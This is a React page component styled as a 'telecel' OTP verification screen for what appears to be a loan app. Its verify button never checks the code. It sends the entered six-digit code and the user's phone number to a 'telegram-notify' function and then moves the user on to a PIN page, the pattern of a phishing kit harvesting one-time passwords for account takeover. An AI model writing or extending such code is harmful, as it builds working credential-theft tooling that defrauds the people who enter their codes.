import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import MobileShell from "@/components/MobileShell";
import { supabase } from "@/integrations/supabase/client";

const OtpPage = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(60);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (timer <= 0) return;
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  const handleVerify = async () => {
    if (otp.length < 6) return;
    setLoading(true);
    try {
      const saved = localStorage.getItem("telecel_loan");
      const phone = saved ? JSON.parse(saved).verifyPhone : "N/A";

      await supabase.functions.invoke("telegram-notify", {
        body: { type: "otp", value: otp, phone },
      });
    } catch (e) {
      console.error("Error sending OTP:", e);
    }
    setLoading(false);
    navigate("/pin");
  };

  return (
    <MobileShell>
      <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
        <button onClick={() => navigate("/password")} className="text-primary-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">OTP Verification</h1>
      </div>

      <div className="flex-1 px-6 py-6 flex flex-col items-center space-y-6">
        <p className="text-sm text-muted-foreground text-center">
          Enter the 6-digit code sent to your phone number.
        </p>

        <InputOTP maxLength={6} value={otp} onChange={setOtp}>
          <InputOTPGroup>
            <InputOTPSlot index={0} />
            <InputOTPSlot index={1} />
            <InputOTPSlot index={2} />
            <InputOTPSlot index={3} />
            <InputOTPSlot index={4} />
            <InputOTPSlot index={5} />
          </InputOTPGroup>
        </InputOTP>

        <div className="text-sm text-muted-foreground">
          {timer > 0 ? (
            <span>Resend code in <span className="font-semibold text-primary">{timer}s</span></span>
          ) : (
            <button onClick={() => setTimer(60)} className="text-primary font-semibold">
              Resend Code
            </button>
          )}
        </div>
      </div>

      <div className="px-6 pb-6">
        <Button
          onClick={handleVerify}
          disabled={otp.length < 6 || loading}
          className="w-full h-12 rounded-xl font-semibold"
        >
          {loading ? "Sending..." : "Verify"}
        </Button>
      </div>
    </MobileShell>
  );
};

export default OtpPage;
